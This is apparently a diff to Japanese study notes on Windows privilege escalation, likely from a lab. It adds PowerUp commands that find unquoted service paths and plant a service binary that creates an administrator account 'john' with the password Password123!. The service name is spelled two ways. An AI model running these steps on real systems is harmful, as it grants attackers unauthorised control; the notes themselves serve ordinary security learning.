@@ -15,3 +15,14 @@ powershell -ep bypass
 ```.ps1
 Get-ModifiableServiceFile
 ```
+
+2. Unquoted-Serviceの脆弱性がある可能性のあるバイナリとサービスを列挙する
+```.ps1
+Get-UnquotedService
+```
+
+3. GammbaServiceというサービスのパスに、Current.exeのバイナリファイルを書き込む。  
+デフォルトではjohnユーザがパスワードPassword123!で作られる。
+```.ps1
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+```
